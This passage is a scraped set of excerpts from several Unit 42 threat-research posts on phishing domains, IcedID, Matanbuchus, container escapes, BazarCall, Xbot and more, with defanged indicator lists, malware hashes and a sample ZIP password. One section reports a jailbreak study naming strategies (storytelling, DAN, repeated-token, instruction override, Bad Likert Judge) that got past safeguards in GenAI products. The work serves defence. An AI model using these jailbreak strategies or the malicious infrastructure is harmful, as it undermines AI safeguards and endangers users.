a detector to identify stockpiled domains. The two main advantages of detecting stockpiled domains are expanding coverage of malicious domains and providing patient-zero detections as attackers stock up on domains for future use.\nTo detect stockpiled domains, we engineered over 300 features to process many terabytes of data and billions of pDNS and certificate records. We used a knowledge base of millions of malicious and benign domains to calculate certificate and pDNS reputation and to train and test a Random Forest machine learning algorithm.\nAs of July 2023, our detection pipeline has found 1,114,499 unique stockpiled root domain names and identifies tens of thousands of malicious domains weekly. Our model, on average, found stockpiled domains 34.4 days earlier compared to vendors on VirusTotal. The success of our approach emphasizes the need to combine multiple large datasets, such as passive DNS and certificate logs, to detect malicious campaigns.\nThe stockpiled detector continuously picks up a wide variety of scam, phishing, malware distribution, C2 and other campaigns. Some of these phishing campaigns target the largest software companies, online retail shops, banks, streaming services and more. In this article, we share both large campaigns leveraging thousands of domains and small campaigns involving just a few domains.\nPalo Alto Networks customers receive protection against stockpiled domains by leveraging our automated classifier in multiplePalo Alto Networks Next-Generation Firewallcloud-delivered security services, includingAdvanced Wildfire,DNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "As the domain wars unfolded, cybercriminals started to automate their infrastructure setup. However, bulk domain registration and infrastructure automation can leave crumbs of information that allow us to detect stockpiled domains. The success of our approach emphasizes the need for security defenders looking to improve their detection to combine multiple large datasets, such as pDNS and certificate logs, to uncover malicious campaigns.\nOur high-precision, machine learning-based detector processes terabytes of certificate and DNS logs to discover thousands of stockpiled domains weekly. Our detection pipeline has uncovered a wide variety of different types of campaigns earlier than VirusTotal vendors, and we also found domains that were not detected by others.\nPalo Alto Networks customers receive protection against stockpiled domains by leveraging our automated classifier in multiplePalo Alto Networks Next-Generation Firewallcloud-delivered security services, includingDNS SecurityandAdvanced URL Filtering.\nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research.", "source": "Palo"}, {"title": "Indicators", "content": "Puppy Scam Example Domain\nBaronessabernesemountaindogpuppies[.]com\nMalicious Redirection Campaign Domains\nWhdytdof[.]tk \nPbyiyyht[.]gq \nRthgjwci[.]cf \nCgptvfjz[.]ml \nThewinjackpot[.]life\nPostal Phishing Campaign Domains\nAbschlussschritte-info[.]com \nAksunnatechnologies[.]com \n222camo[.]com \nRothost[.]best\nA Sample of USPS Phishing Campaign Domains\nDelivery-usps[.]vip \nDelivery-usps[.]wiki \nDelivery-usps[.]ren \nUsps-redelivery[.]art \nUsps-redelivery[.]live\nUSPS Phishing Campaign Certificate SHA-1 Fingerprints\n18:FF:07:F3:05:A7:6A:C2:7A:38:89:C5:06:FD:D7:B8:D9:06:88:AB \n89:29:97:5E:E9:F7:14:D9:95:16:9B:B3:74:33:0C:7B:D0:8F:98:30 \nB6:74:45:84:0C:FF:81:05:C2:28:0F:EF:91:23:D8:A0:E8:ED:3A:2E \n6A:21:31:8B:F4:0A:04:40:FA:37:46:15:A3:CE:1F:0A:C5:0A:93:C3\nHigh Yield Investment Scam Campaign Domains\nErinemailbiz[.]com \nMakemoneygeorge[.]com \nNatashafitts[.]com \nJulieyeoman[.]com \nCheckout.mytraffic[.]biz", "source": "Palo"}, {"title": "Introduction", "content": "When launching and persisting attacks at scale, threat actors can inadvertently leave behind traces of information. They often reuse, rotate and share portions of their infrastructure when automating their campaign's setup before launching an attack. Defenders can leverage this behavior by pivoting on a few known indicators to uncover newer infrastructure.\nThis article describes the benefits of automated pivoting and uses three case studies to show how we can discover new indicators. Using a network crawler leveraging relationships among domains, we discovered network artifacts around known indicators and trained agraph neural network(GNN) to detect additional malicious domains.\nThese three case studies show that defenders can proactively discover attack infrastructure by continuously monitoring a threat actor's evolving indicators. The three case studies covered in this article are:\nA postal services phishing campaign \nA credit card skimmer campaign \nA financial services phishing campaign\nPalo Alto Networks customers are better protected from the threats discussed in this article viaAdvanced URL FilteringandAdvanced DNS Security, which deploy proactive threat hunting capabilities to discover malicious URL infrastructure.Advanced WildFirealso provides coverage for the associated samples and other indicators discussed in this post.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "Threat actors launch large-scale attacks using extensive hosting infrastructure, but this infrastructure changes over time as the attackers attempt to evade detection. This article described our automated GNN approach to pivoting on known indicators, so we can discover new infrastructure for active campaigns before attackers weaponize it.\nOur three case studies revealed that threat actors share, reuse and rotate their attack infrastructure. They likely implement these changes through an automated setup process. This process inadvertently leaves behind traces of information we can detect through proactive searching.\nPalo Alto Networks customers are better protected from the threats in this article through the following products:\nAdvanced URL FilteringandAdvanced DNS Securitydeploy proactive threat hunting capabilities to discover malicious URL infrastructure \nAdvanced WildFirecovers the associated samples and other indicators discussed in this post\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Examples of domains used in Squeamish Libra (FIN7) activity:\nadvanced-ip-sccanner[.]com \nipscanneronline[.]com \nipscannershop[.]com \nmyipscanner[.]com \nmyscannappo[.]com \nmyscannappo[.]info \nmyscannappo[.]online \ntheipscanner[.]com\nExamples of domains used in postal service-themed phishing:\ncorreoparaguayo-myposta[.]top \ncorreoparaguayo-mypostf[.]top \ncorreoparaguayo-myposth[.]top \ncorreoparaguayo-myposts[.]top \ncorreoparaguayo-mypostvsa[.]top \ncorreoparaguayo-mypostvsd[.]top \ncorreoparaguayo-mypostvse[.]top \ncorreoparaguayo-mypostvsf[.]top \ncorreoparaguayo-mypostvsg[.]top \ncorreoparaguayo-mypostvsh[.]top \ncorreoparaguayo-mypostvsi[.]top \ncorreoparaguayo-mypostvsl[.]top \ncorreoparaguayo-mypostvsp[.]top \ncorreoparaguayo-mypostvst[.]top \ncorreoparaguayo-mypostvsu[.]top \ncorreoparaguayo-mypostvsx[.]top \ncorreoparaguayo-mypostvsy[.]top \ncorreoparaguayo-mypostvsz[.]top \ncorreosespe[.]top \ncorreoseswe[.]top \ncorreospanamaagobs-csc[.]top \ncorreospanamaagobs-csd[.]top \ncorreospanamaagobs-cse[.]top \ncorreospanamaagobs-csr[.]top \ncorreospanamaagobs-css[.]top \ncorreospanamaagobs-csx[.]top \nkoreapostge[.]shop \nkoreapostma[.]shop \nkoreapostmk[.]shop \nkoreapostmv[.]shop \nkoreapostmx[.]shop \nkoreapostmz[.]shop \nkoreapostni[.]shop \nkoreapostnp[.]shop \nkoreapostnu[.]shop \nkoreapostpc[.]shop \nkoreapostpe[.]shop \nkoreapostpf[.]shop \nkoreapostpg[.]shop \nkoreapostpo[.]shop \nkoreapostpt[.]shop \nkoreapostpu[.]shop \nkoreapostpw[.]shop \nkoreapostst[.]shop \nkoreapostxb[.]shop \nkoreapostxn[.]shop \nkoreapostxt[.]shop \nus-usos-qwtaa[.]top \nus-usos-qwtad[.]top \nus-usos-qwtaz[.]top \nusps-supsrfvw[.]top \nusps-supsrmuo[.]top \nusps-supsrrne[.]top \nusps-supsrrno[.]top \nusps-supsrtys[.]top \nuspsepsu[.]top \nuspsftpr[.]top \nuspsfugu[.]top \nuspsgrjp[.]top \nuspsntfj[.]top \nuspstpar[.]top \nuspsyeay[.]top \nuspsygfk[.]top\nExamples of domains used in web skimmer campaign:\nbyvlsa[.]com \ncdn-google-tag[.]info \ncdn-report[.]com \ncdnreport[.]net \nchatwareopenalgroup[.]net \ncssjs[.]co \ngoogle-site-verification[.]com \njquerylib-min[.]net \njsmin[.]co \nns1.static5-jquery[.]com \nns2.static5-jquery[.]com \nssl-google-analytics[.]com \nstatic5-jquery[.]com \nstaticlitycis[.]com \nwoocomnnerce[.]com\nExamples of domains used in financial services phishing activity:\napps.guardiantrustbanks[.]us \ncapitalxpresslogistic.live.firstnationalbank[.]live \ndeutsche-chartered-bank.cloudswt[.]com \neurobank-stocks[.]us \neurobank-stockscom[.]com \nftp.pristineglobalinvestmentbank[.]com \ngcorpfinbank[.]info \nhgsgbank.com.nexcreditunion[.]com \ninncbank.com.nexcreditunion[.]com \nmetropoliscapitalbank[.]us \noceansharebank[.]com \npristineglobalinvestmentbank[.]com \nstandardcharteredbank[.]live \ntruistcommercialbank.live.rhinoswiftdelivery[.]live \nwebmail.portal.guardiantrustbank[.]us \nwww.capitalxpresslogistic.live.firstnationalbank[.]live \nwww.deutsche-chartered-bank.cloudswt[.]com", "source": "Palo"}, {"title": "Introduction", "content": "Our introductory blogCold as Ice: Unit 42 Wireshark Quiz for IcedIDprovides a packet capture (pcap) from an IcedID infection in April 2023. This blog provides the answers. Also known as Bokbot, IcedID is well-established Windows-based malware that can lead to ransomware. Reviewing the pcap provides an opportunity to analyze IcedID infection traffic.\nIf you would like to view this quiz without answers, please seeour previous blog introducing the standalone quiz.\nPalo Alto Networks customers are protected from IcedID and other malware throughCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeWildFire,Advanced Threat PreventionandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "This blog provides answers and analysis for our Unit 42 Wireshark quiz featuring an IcedID infection from April 2023. IcedID is important to identify and stop, because it is aknown vector for ransomware infections.\nMany organizations lack access to full packet capture in their IT environment. As a result, security professionals might lack experience reviewing IcedID and other malware traffic. Training material like this Wireshark quiz can help. Pcap analysis is a useful skill that helps us better understand malicious activity.\nYou can also read the original post, without answers, from ourstandalone quiz post.\nPalo Alto Networks customers are protected from IcedID and other malware throughCortex XDRand ourNext-Generation FirewallwithCloud-Delivered Security Servicesthat includeWildFire,Advanced Threat PreventionandAdvanced URL Filtering.\nIf you think you might have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Traffic from the pcap related to the IcedID infection:\nhxxp://80.77.24[.]175/main.php \nhxxps://firebasestorage.googleapis[.]com/v0/b/serene-cathode-377701.appspot.com/o/XSjwp6O0pq%2FScan_Inv.zip?alt=media&token=a716bdce-1373-44ed-ae89-fdabafa31c61 \n192.153.57[.]223:80-hxxp://skigimeetroc[.]com/ \n104.168.53[.]18:443-askamoshopsi[.]com- HTTPS traffic \n217.199.121[.]56:443-skansnekssky[.]com- HTTPS traffic \n193.149.176[.]100:443- BackConnect traffic\nFiles associated with traffic from this IcedID infection:\nSHA256 hash:fc96c893a462660e2342febab2ad125ce1ec9a90fdf7473040b3aeb814ba7901 \nFile size: 262,343 bytes \nFilename:Scan_Inv.zip \nFile description: Password-protected ZIP archive hosted on Firebase Storage URL \nPassword: 1235 \nMalwareBazaar Database sample \nSHA256 hash:bd24b6344dcde0c84726e620818cb5795c472d9def04b259bf9bff1538e5a759 \nFile size: 333,408 bytes \nFilename:Scan_Inv.exe \nFile description: Windows executable file for IcedID installer \nMalwareBazaar Database sample", "source": "Palo"}, {"title": "Introduction", "content": "While Microsoft documents that leverage malicious, embedded Visual Basic for Applications (VBA) macros are not a new thing, their use hasnoticeably increasedthis year, thanks in part to theirsimplicity and effectiveness.\nSome threat actors commonly use this class of malware to drop a second stage payload on victim systems. Even though Microsoft attempts to mitigate this threat by disabling macros by default, the percentage of users who explicitly bypass this protection and enable macros remains high.\nExploiting the human factor, the most effective attacker strategy is the tried and true spear phishing attack, ideally made to look authentic by appearing to originate from a legitimate organization/individual and containing role-relevant or topic-of-interest content to entice its intended target. This post examines an information stealer campaign that leveraged a VBA macro script, focusing on its progression, from delivery to Command and Control (C2), and its attribution to a malicious actor for context on objectives and motivation.", "source": "Palo"}, {"title": "Conclusion", "content": "This case epitomizes how easy it has become these days to steal sensitive information from victims who fall prey to such campaigns. Associated tools can be bought online for less than $100, which often also includes support packages that rival those of mainstream commercial software.\nStolen information can be used for more than standard credit card fraud. The crossover between malicious actor objectives may include opportunistic aspects of cyber espionage, extortion, identity theft, intellectual capital theft, and much more. It is also important to note that none of the major anti-virus (AV) vendors detected this threat at the time it was delivered. The natural gap between creation of these threats and a corresponding signature for their detection by traditional AV remains a sweet spot for successful malicious campaigns. Therefore, it is increasingly important to properly architect and deploy network and endpoint protections to ensure thorough and effective defense of computing and information assets.\nThe Palo Alto Networks Enterprise Security Platform is a prime example of technology meant to address and minimize the risk associated with emerging threats. Learn more about the platformhere.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers often spend time investigating what we call non-traditional sources. Non-traditional sources often include underground marketplaces and sites, spanning from forums on the Tor network to Telegram channels and other marketplaces. One such case that we investigated involves a threat actor called BelialDemon, who is a member of several underground forums and marketplaces.\nIn February 2021, BelialDemon advertised a new malware-as-a-service (MaaS) called Matanbuchus Loader and charged an initial rental price of $2,500. Malware loaders are malicious software that typically drop or pull down second-stage malware from command and control (C2) infrastructures. Matanbuchus has the following capabilities:\nThe ability to launch a .exe or .dll file in memory. \nThe ability to leverage schtasks.exe to add or modify task schedules. \nThe ability to launch custom PowerShell commands. \nThe ability to leverage a standalone executable to load the DLL if the attacker otherwise has no way of doing so.\nWe discovered several organizations impacted by Matanbuchus including a large university and high school in the United States, as well as a high-tech organization in Belgium.\nAfter observing the user BelialDemon operating in well-established underground forums, we've noticed they stick to a particular biblical theme: their name, Belial, along with the name of their new loader, Matanbuchus, stem from theAscension of Isaiah2:4: \"And Manasseh turned aside his heart to serve Belial; for the angel of lawlessness, who is the ruler of this world, is Belial, whose name is Matanbuchus.\" A fitting theme for their operations.\nThis blog sheds light on Matanbuchus, BelialDemon and the malware's infrastructure.", "source": "Palo"}, {"title": "Conclusion", "content": "This blog highlights how threat intelligence can be generated from hunting for threats observed in the wild and how small pieces of seemingly disparate data can chain together to strengthen analysis, extract indicators and improve defenses for your organization before being impacted.\nPalo Alto Networks customers are protected from this threat by:\nWildFire: All known samples are identified as malware. \nCortex XDR with:Indicators for Matanbuchus. \nIndicators for Matanbuchus. \nNext-Generation Firewalls: DNS Signatures detect the known command and control (C2) domains, which are also categorized as malware inAdvanced URL Filtering. \nAutoFocus: Tracking related activity using the Matanbuchus tag.\nIndicators of Compromise", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews container escape techniques, assesses their possible impact and reveals how to detect these escapes from the perspective of endpoint detection and response (EDR).\nAs cloud services rise in popularity, so does the use of containers, which have become an integrated part of cloud infrastructure. Although containers provide many advantages, they are also susceptible to attack techniques like container escapes.\nMany containers are internet-facing, which poses an even greater security risk. For example, an external attacker who has gained low-privilege access to a container will attempt to escape it through a variety of methods that include exploiting misconfigurations and vulnerabilities.\nContainer escapes are a notable security risk for organizations, because they can be a critical step of an attack chain that can allow malicious threat actors access. We previously published one such attack chain in anarticle about a runC vulnerability. In it, we discuss how attackers could exploit CVE-2019-5736 to gain root-level code execution and break out of a Docker container. Since then, organizations have increasingly published similar vulnerabilities that attackers could use to escape containers.\nPalo Alto Networks customers are better protected from the container escape techniques we discuss in this article with ourCortexandPrisma Cloudsolutions.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "In this article, we examined different container escape methods. The results highlight the growing risk of attack amid the increasing popularity of container technology. While some methods could grant an attacker partial access to the host of a container, other techniques can grant attackers full access to the host. As more organizations use containers, the risk from these escape techniques will likely remain a notable feature of our threat landscape.\nTo mitigate potential attacks, anyone who uses containers must be aware of the risk of these techniques and adhere to recommended security and detection guidelines.\nWe have incorporated robust detection logic in Cortex XDR based on the detection principles discussed in this article.\nPalo Alto Networks customers receive better protection from these container escape techniques throughCortex XDR,XSIAM Linux Agent,Cortex XDR agent for Cloudand thePrisma Cloud Defender Agentfor customers using the \"Container Escaping\" module.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Threat actors tend to reuse certain tools, a trend we observed during recent Unit 42 research published onMNKit. In this post, we will discuss a fresh toolkit, which on the surface, appeared similar to MNKit, but functionally was found to be quite different.\nThis toolkit, which we named \"HOMEKit\", is similar to MNKit in that it is also designed to generate weaponized Microsoft Word documents containing an exploit for CVE-2012-0158, but it uses OLE instead of MHTML files. In addition, we have been able to track the use of HOMEKit by its operators since 2013 across a variety of campaigns, using several different variants of the toolkit. For this post, we will be focusing on the most recent example of the HOMEKit toolkit, in addition to an interesting overlap we discovered with the well-known attack campaign DarkHotel. In a follow-up post, we will discuss the other campaigns associated with HOMEKit, along with other variants of HOMEKit that we discovered.\nIn addition to analysis of HOMEKit, we will also examine a new payload we discovered embedded in one of the malicious documents created by HOMEKit, which we have named \"Cookle.\" It is a fairly simple downloader tool, but until now has not been publicly discussed. Cookle deploys some interesting tactics to obfuscate its activity.", "source": "Palo"}, {"title": "Conclusion", "content": "As we have highlighted several times in the past, the reuse of tools is quite common amongst various threat actor groups. Our next post will further map out the various campaigns associated with HOMEKit, along with the multiple variants discovered in the span of several years. The DarkHotel payload however, is a curious outlier in the grouping of payloads we were able to identify. It is possible that the DarkHotel threat actors were able to obtain a copy of the HOMEKit codebase somehow, or even possible that the Tapaoux Trojan was obtained by operators with access to HOMEKit. It is also possible that HOMEKit is a toolkit available to multiple threat actors, via a connected intermediary. Unfortunately, at this time, a lack of data does not allow us to come to a definitive answer. Regardless, it is yet another example of tool sharing and overlap, this time with surprising results.\nPalo Alto Networks customers are protected and can learn more via the following resources: \nAll samples of this HOMEKit variant and Cookle are detected as malicious by WildFire \nAll domains described in this post are classified as malicious \nHOMEKitandCookleAutoFocus tags created", "source": "Palo"}, {"title": "Indicators", "content": "ed676d191684fa03b2b57925fe081cf32d5d6b074637f6f2a6401dd891818752ab7b5c35786813ed874483d388edbee3736eb6af7bc4946c41794209026eeac4f9bf645a3a7d506136132fcfa18ddf057778d641ff71d175afd86f1a4fed7ee9\n4a5807bab603d3a0a5d36aaec75729310928a9a57375b7440298fb3f3e4a2279\ndyn.kaleebso[.]comdyn.pwnz[.]org\n2437d0a9cc019e33fe8306fceed99605dd5ab67a8023da65fa20b9815ec19d06bb06bfad96535ad04a6e65a6e68f34cb51f311cae48a2ff1c305f3957b2c8a4b\napply-wsu.ebizx[.]netapply.ebizx[.]net", "source": "Palo"}, {"title": "Introduction", "content": "This article summarizes our investigation into jailbreaking 17 of the most popular generative AI (GenAI) web products that offer text generation or chatbot services.\nLarge language models (LLMs) typically include guardrails to prevent users from generating content considered unsafe (such as language that is biased or violent). Guardrails also prevent users from persuading the LLM to communicate sensitive data, such as the training data used to create the model or its system prompt. Jailbreaking techniques are used to bypass those guardrails.\nThe goals of our jailbreak attempts were to assess both types of issues.\nOur findings provide a more practical understanding of how jailbreaking techniques could be used to adversely affect end users of LLMs. We did this by directly evaluating the GenAI applications and products that are in use by consumers, rather than focusing on a specific underlying model.\nWe hypothesized that GenAI web products would implement robust safety measures beyond their base models' internal safety alignments. However, our findings revealed that all tested platforms remained susceptible to LLM jailbreaks.\nKey findings of our investigation include:\nAll the investigated GenAI web products are vulnerable to jailbreaking in some capacity, with most apps susceptible to multiple jailbreak strategies. \nMany straightforward single-turn jailbreak strategies can jailbreak the investigated products. This includes a known strategy that can produce data leakage.Among the single-turn strategies tested, some proved particularly effective, such as \"storytelling,\" while some previously effective approaches such as \"do anything now (DAN),\" had lower success jailbreak rates.One app we tested is still vulnerable to the \"repeated token attack,\" which is a jailbreak technique used to leak a model's training data. However, this attack did not affect most of the tested apps. \nAmong the single-turn strategies tested, some proved particularly effective, such as \"storytelling,\" while some previously effective approaches such as \"do anything now (DAN),\" had lower success jailbreak rates. \nOne app we tested is still vulnerable to the \"repeated token attack,\" which is a jailbreak technique used to leak a model's training data. However, this attack did not affect most of the tested apps. \nMulti-turn jailbreak strategies are generally more effective than single-turn approaches at jailbreaking with the aim of safety violation. However, they are generally not effective for jailbreaking with the aim of model data leakage.\nGiven the scope of this research, it was not feasible to exhaustively evaluate every GenAI powered web product. To ensure we do not create any false impressions about specific providers, we have chosen to anonymize the tested products mentioned throughout the article.\nIt is important to note that this study targets edge cases and does not necessarily reflect typical LLM use cases. We believe most AI models are safe and secure when operated responsibly and with caution.\nWhile it can be challenging to guarantee complete protection against all jailbreaking techniques for a specific LLM, organizations can implement security measures that can help monitor when and how employees are using LLMs. This becomes crucial when employees are using unauthorized third-party LLMs.\nThe Palo Alto Networks portfolio of solutions, powered byPrecision AI, can help shut down risks from the use of public GenAI apps, while continuing to fuel an organization's AI adoption. TheUnit 42 AI Security Assessmentcan speed up innovation, boost productivity and enhance your cybersecurity.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "Many web products have incorporated LLMs in their core services. However, they can generate harmful content if not properly controlled. To mitigate this risk, LLMs are trained with safety alignments to prevent the production of harmful content.\nHowever, these safety alignments can be bypassed through a process called LLM jailbreaking. This process involves crafting specific prompts (known as prompt engineering or prompt injection) to manipulate the model's output, and it leads the LLM to generate harmful content.", "source": "Palo"}, {"title": "Conclusion", "content": "Our investigation into the popular GenAI web products reveals that they are vulnerable to LLM jailbreaks.\nOur key takeaways are:\nSingle-turn jailbreak strategies are still fairly effectiveSingle-turn jailbreak strategies proved successful across a wide range of apps and jailbreak categories, although with lower overall effectiveness compared to multi-turn approaches on AI safety violation categories.The previously successful attack strategy DAN is less effective now, indicating that such jailbreak techniques may be specifically targeted in the latest LLM updates. \nSingle-turn jailbreak strategies proved successful across a wide range of apps and jailbreak categories, although with lower overall effectiveness compared to multi-turn approaches on AI safety violation categories. \nThe previously successful attack strategy DAN is less effective now, indicating that such jailbreak techniques may be specifically targeted in the latest LLM updates. \nMulti-turn strategies are more effective compared to single-turn strategies in AI safety violation jailbreak goals. However, some single-turn strategies like Story telling and Role Play are still pretty effective on achieving the jailbreak goals. \nWhile both single-turn and multi-turn strategies showed limited effectiveness in system prompt leakage attacks, the single-turn strategy Instruction Override and the multi-turn strategy Bad Likert Judge can still achieve this goal on some apps. \nTraining data and PII LeaksGood news: Previously successful techniques (like the repeated token trick) aren't working like they used to.Bad news: We did find one app that is still vulnerable to this attack, suggesting that GenAI products using older or private LLMs might still be at risk for data leakage attacks. \nGood news: Previously successful techniques (like the repeated token trick) aren't working like they used to. \nBad news: We did find one app that is still vulnerable to this attack, suggesting that GenAI products using older or private LLMs might still be at risk for data leakage attacks.\nBased on our observations in this study, we found that the majority of tested apps have employed LLMs with improved alignment against previously documented jailbreak strategies. However, as LLM alignment can still be bypassed relatively easily, we recommend the following security practices to further enhance protection against jailbreak attacks:\nImplement Comprehensive Content Filtering: Deploy both prompt and response filters as a critical defense layer. Content filtering systems running alongside the core LLM can detect and block potentially harmful content in both user inputs and model outputs. \nUse Multiple Filter Types: Employ diverse filtering mechanisms tailored to different threat categories, including prompt injection attacks, violence detection, and other harmful content classifications. Various established solutions are available, such as OpenAI Moderation, Azure AI Services Content Filtering, and other vendor-specific guardrails. \nApply Maximum Content Filtering Settings: Enable the strongest available filtering settings and activate all available security filters. Our previous research on theBad Likert Judgejailbreak strategy has shown that a strong content filtering setting can reduce attack success rates by an average of 89.2 percentage points.\nBut we do note that while the content filtering can effectively mitigate broader types of jailbreak attacks, they are not infallible. Determined adversaries may still develop new techniques to bypass these protections.\nWhile it can be challenging to guarantee complete protection against all jailbreaking techniques for a specific LLM, organizations can implement security measures that can help monitor when and how employees are using LLMs. This becomes crucial when employees are using unauthorized third-party LLMs.\nThe Palo Alto Networks portfolio of solutions, powered byPrecision AI, can help shut down risks from the use of public GenAI apps, while continuing to fuel an organization's AI adoption. TheUnit 42 AI Security Assessmentcan speed up innovation, boost productivity and enhance your cybersecurity.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America: Toll Free: +1 (866) 486-4842 (866.4.UNIT42) \nUK: +44.20.3743.3660 \nEurope and Middle East: +31.20.299.3130 \nAsia: +65.6983.8730 \nJapan: +81.50.1790.0200 \nAustralia: +61.2.4062.7950 \nIndia: 00080005045107\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "Many illicit network services, including phishing campaigns and online gambling platforms, exploit traffic distribution systems (TDS) to redirect network traffic. A TDS acts as a central hub, redirecting victims through an often complex network of servers to obfuscate the final destination and hinder detection of these operations. This infrastructure also facilitates the management of multiple malicious endpoints simultaneously.\nAnalyzing the resolution and redirection traffic allows us to construct relationship networks among different URLs and identify TDS infrastructure. We have found that malicious TDS traffic exhibits significant topological characteristics compared to benign redirection networks. For example, malicious TDS infrastructure typically presents more URLs and a higher number of connections than benign TDS networks.\nWe combined the topological insights about malicious TDS infrastructure and comprehensive threat intelligence to build a machine learning (ML) powered malicious TDS detection system. Our detection system can capture various malicious TDS infrastructure hosting different types of cyberthreats or suspicious activities including malvertising, phishing and gambling services.\nOurAdvanced DNS SecurityandAdvanced URL Filteringservices continuously monitor and scan the traffic in our customers' networks to hunt for malicious indicators.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Introduction", "content": "BazarLoader(sometimes referred to as BazaLoader) is malware that provides backdoor access to an infected Windows host. After a client is infected, criminals use this backdoor access to send follow-up malware, scan the environment and exploit other vulnerable hosts on the network.\nThe threat actor behind BazarLoader uses different methods to distribute this malware to potential victims. In earlyFebruary 2021, researchers began reporting a call center-based method of distributing BazarLoader. This method utilizes emails with a trial subscription-based theme that encourages potential victims to call a phone number. A call center operator then answers and directs victims to a website to unsubscribe from the service. Call center operators offer to personally guide victims through a process designed to infect vulnerable computers with BazarLoader. An example of the process can be found inthis YouTube video.\nThis call center-based process of infecting computers with BazarLoaderhas been dubbed the \"BazarCall\" method(sometimes referred to as \"BazaCall\" method).\nPalo Alto NetworksNext-Generation Firewallcustomers are protected from this threat with aThreat Preventionsecurity subscription.", "source": "Palo"}, {"title": "Conclusion", "content": "As early as February 2021, we have seen several reports of the BazarCall method distributing BazarLoader malware using call center personnel. These infections follow noticeable patterns, and they can lead to other malware like Cobalt Strike, Anchor and Ryuk ransomware.\nOrganizations with decent spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection from BazarLoader malware and its post-infection activity.Palo Alto Networks Next-Generation Firewallcustomers are further protected from this threat with aThreat Prevention security subscription.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise described in this report, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visitwww.cyberthreatalliance.org.", "source": "Palo"}, {"title": "Indicators", "content": "Appendix A\nExamples of BazarCall emails (March and April 2021):GitHub repository.\nAppendix B\nExamples of domains hosting the fake websites used for the BazarCall method (March and April 2021):GitHub repository.\nAppendix C\n96 examples of Excel spreadsheets from unsubscribe pages from fake websites using the BazarCall method (March and April 2021):GitHub repository.\nAppendix D\n11 examples of BazarLoader DLL files dropped by Excel spreadsheet macros (March and April 2021):GitHub repository.\nAppendix E\nSHA256 hashes for 24 examples of BazarLoader EXE files retrieved by BazarLoader (March and April 2021):GitHub repository.", "source": "Palo"}, {"title": "Introduction", "content": "We recently discovered 22 Android apps that belong to a new Trojan family we're calling \"Xbot\". This Trojan, which is still under development and regularly updated, is already capable of multiple malicious behaviors. It tries to steal victims' banking credentials and credit card information via phishing pages crafted to mimic Google Play's payment interface as well as the login pages of 7 different banks' apps. It can also remotely lock infected Android devices, encrypt the user's files in external storage (e.g., SD card), and then ask for a U.S. $100 PayPal cash card as ransom. In addition, Xbot will steal all SMS messages and contact information, intercept certain SMS messages, and parse SMS messages for mTANs (Mobile Transaction Authentication Number) from banks.\nSo far the malware doesn't appear to be widespread, and some markers in its code and faked app interfaces indicate, at least for now, it mainly appears to target Android users in Russia and Australia. Of note, of the seven bank apps it is seen to imitate, six of them belong to some of the most popular banks in Australia. However, Xbot was implemented in a flexible architecture that could be easily extended to target more Android apps. Given we also observed the author making regular updates and improvements, this malware could soon threaten Android users around the world.\nXbot primarily uses is a popular attack technique called \"activity hijacking\" by abusing some features in Android. The apps Xbot is mimicking are not themselves being exploited. Starting with Android 5.0, Google adopted a protection mechanism to mitigate this attack but other attack approaches used by Xbot are still affecting all versions of Android.", "source": "Palo"}, {"title": "Conclusion", "content": "While Android users running version 5.0 or later are so far protected from some of Xbot's malicious behaviors, all users are vulnerable to at least some of its capabilities. As the author appears to be putting considerable time and effort into making this Trojan more complex and harder to detect, it's likely that its ability to infect users and remain hidden will only grow, and that the attacker will expand its target base to other regions around the world. We'll continue to watch and report on this threat as the attacker introduces new versions. We also want to re-emphasize that the banking apps imitated by Xbot are not themselves being exploited.\nCustomers of Palo Alto Networks are protected with our 